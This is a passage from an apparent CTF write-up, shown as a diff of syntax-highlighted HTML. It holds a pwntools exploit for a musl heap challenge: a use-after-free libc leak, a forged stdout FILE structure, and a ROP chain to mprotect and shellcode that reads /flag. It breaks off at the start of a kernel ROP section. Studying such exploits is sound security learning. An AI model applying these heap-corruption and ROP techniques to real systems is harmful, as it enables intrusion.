-def update(idx, size, content=<span class="hljs-string">b'callmecro'</span>):
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">update</span><span class="hljs-params">(idx, size, content=<span class="hljs-string">b'callmecro'</span>)</span>:</span>
     sla(<span class="hljs-string">b'Command: '</span>, <span class="hljs-string">b'2'</span>)
     sla(<span class="hljs-string">b'Index: '</span>, str(idx).encode())
     sla(<span class="hljs-string">b'Size: '</span>, str(size).encode())
     <span class="hljs-keyword">if</span> size &lt;= <span class="hljs-number">1</span>:
-        return 
+        <span class="hljs-keyword">return</span> 
 
     <span class="hljs-keyword">if</span> size == len(content):
         sa(<span class="hljs-string">b'Content: '</span>, content)
     <span class="hljs-keyword">else</span>:
         sla(<span class="hljs-string">b'Content: '</span>, content)
 
-def <span class="hljs-keyword">delete</span>(idx):
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span><span class="hljs-params">(idx)</span>:</span>
     sla(<span class="hljs-string">b'Command: '</span>, <span class="hljs-string">b'3'</span>)
     sla(<span class="hljs-string">b'Index: '</span>, str(idx).encode())
 
-def view(idx):
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">view</span><span class="hljs-params">(idx)</span>:</span>
     sla(<span class="hljs-string">b'Command: '</span>, <span class="hljs-string">b'4'</span>)
     sla(<span class="hljs-string">b'Index: '</span>, str(idx).encode())
     ru(<span class="hljs-string">b': '</span>)
-    return ru(<span class="hljs-string">b'\n1. Allocate'</span>)[:-<span class="hljs-number">12</span>]
+    <span class="hljs-keyword">return</span> ru(<span class="hljs-string">b'\n1. Allocate'</span>)[:<span class="hljs-number">-12</span>]
 
-def pwn():
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pwn</span><span class="hljs-params">()</span>:</span>
     cc()
 
-    allocate(<span class="hljs-number">0</span>x1b0) <span class="hljs-comment"># 0</span>
-    allocate(<span class="hljs-number">0</span>x1b0) <span class="hljs-comment"># 1</span>
+    allocate(<span class="hljs-number">0x1b0</span>) <span class="hljs-comment"># 0</span>
+    allocate(<span class="hljs-number">0x1b0</span>) <span class="hljs-comment"># 1</span>
 
-    allocate(<span class="hljs-number">0</span>x100) <span class="hljs-comment"># 2</span>
-    allocate(<span class="hljs-number">0</span>x100) <span class="hljs-comment"># 3</span>
+    allocate(<span class="hljs-number">0x100</span>) <span class="hljs-comment"># 2</span>
+    allocate(<span class="hljs-number">0x100</span>) <span class="hljs-comment"># 3</span>
 
-    allocate(<span class="hljs-number">0</span>x120) <span class="hljs-comment"># 4</span>
-    allocate(<span class="hljs-number">0</span>x120) <span class="hljs-comment"># 5</span>
-    allocate(<span class="hljs-number">0</span>x120) <span class="hljs-comment"># 6</span>
+    allocate(<span class="hljs-number">0x120</span>) <span class="hljs-comment"># 4</span>
+    allocate(<span class="hljs-number">0x120</span>) <span class="hljs-comment"># 5</span>
+    allocate(<span class="hljs-number">0x120</span>) <span class="hljs-comment"># 6</span>
 
-    <span class="hljs-keyword">delete</span>(<span class="hljs-number">0</span>)
+    delete(<span class="hljs-number">0</span>)
     update(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>)
-    <span class="hljs-keyword">delete</span>(<span class="hljs-number">2</span>)
+    delete(<span class="hljs-number">2</span>)
 
-    allocate(<span class="hljs-number">0</span>x1b0) <span class="hljs-comment"># 0</span>
-    allocate(<span class="hljs-number">0</span>x1b0) <span class="hljs-comment"># 2</span>
-    <span class="hljs-keyword">delete</span>(<span class="hljs-number">4</span>)
+    allocate(<span class="hljs-number">0x1b0</span>) <span class="hljs-comment"># 0</span>
+    allocate(<span class="hljs-number">0x1b0</span>) <span class="hljs-comment"># 2</span>
+    delete(<span class="hljs-number">4</span>)
 
-    chunk_0x120 = u64(view(<span class="hljs-number">2</span>)[<span class="hljs-number">0</span>x18:<span class="hljs-number">0</span>x20])
+    chunk_0x120 = u64(view(<span class="hljs-number">2</span>)[<span class="hljs-number">0x18</span>:<span class="hljs-number">0x20</span>])
     log.success(<span class="hljs-string">'No.4 chunk: 0x%x'</span>, chunk_0x120)
-    libc.address = chunk_0x120 - <span class="hljs-number">0</span>xb38d0
+    libc.address = chunk_0x120 - <span class="hljs-number">0xb38d0</span>
     log.success(<span class="hljs-string">'libc_addr: 0x%x'</span>, libc.address)
 
-    data_segment = libc.address + <span class="hljs-number">0</span>xb0000
-    stdout = libc.address + <span class="hljs-number">0</span>xb0280
-    mprotect = libc.address + <span class="hljs-number">0</span>x41DC0
+    data_segment = libc.address + <span class="hljs-number">0xb0000</span>
+    stdout = libc.address + <span class="hljs-number">0xb0280</span>
+    mprotect = libc.address + <span class="hljs-number">0x41DC0</span>
 
     log.success(<span class="hljs-string">'stdout: 0x%x'</span>, stdout)
-    my_chunk = libc.address + <span class="hljs-number">0</span>xb0b10
+    my_chunk = libc.address + <span class="hljs-number">0xb0b10</span>
     log.success(<span class="hljs-string">'my_chunk: 0x%x'</span>, my_chunk)
-    chunk_6 = libc.address + <span class="hljs-number">0</span>xb3b50
+    chunk_6 = libc.address + <span class="hljs-number">0xb3b50</span>
 
-    fake_chunk = stdout - <span class="hljs-number">0</span>x10
+    fake_chunk = stdout - <span class="hljs-number">0x10</span>
     <span class="hljs-comment"># 任意写伪造 stdout 首部</span>
-    update(<span class="hljs-number">4</span>, <span class="hljs-number">0</span>x11, p64(fake_chunk - <span class="hljs-number">0</span>x18) + p64(fake_chunk - <span class="hljs-number">0</span>x08))
-    allocate(<span class="hljs-number">0</span>x120) <span class="hljs-comment"># 4</span>
+    update(<span class="hljs-number">4</span>, <span class="hljs-number">0x11</span>, p64(fake_chunk - <span class="hljs-number">0x18</span>) + p64(fake_chunk - <span class="hljs-number">0x08</span>))
+    allocate(<span class="hljs-number">0x120</span>) <span class="hljs-comment"># 4</span>
 
-    <span class="hljs-keyword">delete</span>(<span class="hljs-number">6</span>)
-    update(<span class="hljs-number">6</span>, <span class="hljs-number">0</span>x30, p64(fake_chunk - <span class="hljs-number">0</span>x10) + p64(my_chunk+<span class="hljs-number">0</span>x8))
+    delete(<span class="hljs-number">6</span>)
+    update(<span class="hljs-number">6</span>, <span class="hljs-number">0x30</span>, p64(fake_chunk - <span class="hljs-number">0x10</span>) + p64(my_chunk+<span class="hljs-number">0x8</span>))
 
-    update(<span class="hljs-number">2</span>, <span class="hljs-number">0</span>x150, p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(chunk_6)+p64(my_chunk+<span class="hljs-number">0</span>x8))
+    update(<span class="hljs-number">2</span>, <span class="hljs-number">0x150</span>, p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(chunk_6)+p64(my_chunk+<span class="hljs-number">0x8</span>))
     <span class="hljs-comment"># 6 -----&gt; 通过 unbin，将 stdout_FILE 送上 head 位置</span>
-    allocate(<span class="hljs-number">0</span>x120)
+    allocate(<span class="hljs-number">0x120</span>)
 
     <span class="hljs-comment"># mov     rdx, [rdi+30h];mov     rsp, rdx;mov     rdx, [rdi+38h];jmp     rdx</span>
-    stack_mig = libc.address + <span class="hljs-number">0</span>x78D24
-    ret = libc.address + <span class="hljs-number">0</span>x15292
+    stack_mig = libc.address + <span class="hljs-number">0x78D24</span>
+    ret = libc.address + <span class="hljs-number">0x15292</span>
 
-    pop_rdi = libc.address + <span class="hljs-number">0</span>x15291
-    pop_rsi = libc.address + <span class="hljs-number">0</span>x1d829
-    pop_rdx = libc.address + <span class="hljs-number">0</span>x2cdda
-    pop_rax = libc.address + <span class="hljs-number">0</span>x16a16
-    syscall = libc.address + <span class="hljs-number">0</span>x23720
-    rop_chain = libc.address + <span class="hljs-number">0</span>xb3a20
+    pop_rdi = libc.address + <span class="hljs-number">0x15291</span>
+    pop_rsi = libc.address + <span class="hljs-number">0x1d829</span>
+    pop_rdx = libc.address + <span class="hljs-number">0x2cdda</span>
+    pop_rax = libc.address + <span class="hljs-number">0x16a16</span>
+    syscall = libc.address + <span class="hljs-number">0x23720</span>
+    rop_chain = libc.address + <span class="hljs-number">0xb3a20</span>
 
     rop = flat([
         pop_rdi, data_segment,
-        pop_rsi, <span class="hljs-number">0</span>x8000,
+        pop_rsi, <span class="hljs-number">0x8000</span>,
         pop_rdx, <span class="hljs-number">7</span>,
-        mprotect, rop_chain+<span class="hljs-number">0</span>x40
+        mprotect, rop_chain+<span class="hljs-number">0x40</span>
         ])
     rop += asm(shellcraft.open(<span class="hljs-string">'/flag'</span>))
-    rop += asm(shellcraft.read(<span class="hljs-number">3</span>, data_segment, <span class="hljs-number">0</span>x100))
-    rop += asm(shellcraft.write(<span class="hljs-number">1</span>, data_segment, <span class="hljs-number">0</span>x50))
+    rop += asm(shellcraft.read(<span class="hljs-number">3</span>, data_segment, <span class="hljs-number">0x100</span>))
+    rop += asm(shellcraft.write(<span class="hljs-number">1</span>, data_segment, <span class="hljs-number">0x50</span>))
 
-    update(<span class="hljs-number">5</span>, <span class="hljs-number">0</span>x100, rop)
+    update(<span class="hljs-number">5</span>, <span class="hljs-number">0x100</span>, rop)
 
     poc = flat({
-        <span class="hljs-number">0</span>x30: <span class="hljs-number">1</span>,        <span class="hljs-comment"># f-&gt;wpos</span>
-        <span class="hljs-number">0</span>x38: <span class="hljs-number">1</span>,        <span class="hljs-comment"># f-&gt;wend</span>
-        <span class="hljs-number">0</span>x40: rop_chain, 
-        <span class="hljs-number">0</span>x48: ret, 
-        <span class="hljs-number">0</span>x58: stack_mig,<span class="hljs-comment"># f-&gt;write</span>
-        <span class="hljs-number">0</span>x70: <span class="hljs-number">1</span>,        <span class="hljs-comment"># f-&gt;buf_size</span>
-    }, filler=<span class="hljs-string">b'\x00'</span>, length=<span class="hljs-number">0</span>x120)
+        <span class="hljs-number">0x30</span>: <span class="hljs-number">1</span>,        <span class="hljs-comment"># f-&gt;wpos</span>
+        <span class="hljs-number">0x38</span>: <span class="hljs-number">1</span>,        <span class="hljs-comment"># f-&gt;wend</span>
+        <span class="hljs-number">0x40</span>: rop_chain, 
+        <span class="hljs-number">0x48</span>: ret, 
+        <span class="hljs-number">0x58</span>: stack_mig,<span class="hljs-comment"># f-&gt;write</span>
+        <span class="hljs-number">0x70</span>: <span class="hljs-number">1</span>,        <span class="hljs-comment"># f-&gt;buf_size</span>
+    }, filler=<span class="hljs-string">b'\x00'</span>, length=<span class="hljs-number">0x120</span>)
 
     <span class="hljs-comment"># 7 -----&gt; 分配到 stdout_FILE</span>
-    no_send_allocate(<span class="hljs-number">0</span>x120, poc)
+    no_send_allocate(<span class="hljs-number">0x120</span>, poc)
 
     log.success(<span class="hljs-string">'flag: %s'</span>, regexp_out(ru(<span class="hljs-string">b'}'</span>)))
     <span class="hljs-comment"># flag{use_musl_4ft3r_fr33}</span>
     cl()
 
 <span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
-    pwn()</span></code></pre><h3 id="kbrop"><a class="header-link" href="#kbrop"></a>kbrop</h3>
+    pwn()</code></pre><h3 id="kbrop"><a class="header-link" href="#kbrop"></a>kbrop</h3>
 <p>直接当作没有ksalr，然后爆破差不多几百次能出</p>
 <pre class="hljs"><code><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _GNU_SOURCE</span>
 <span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
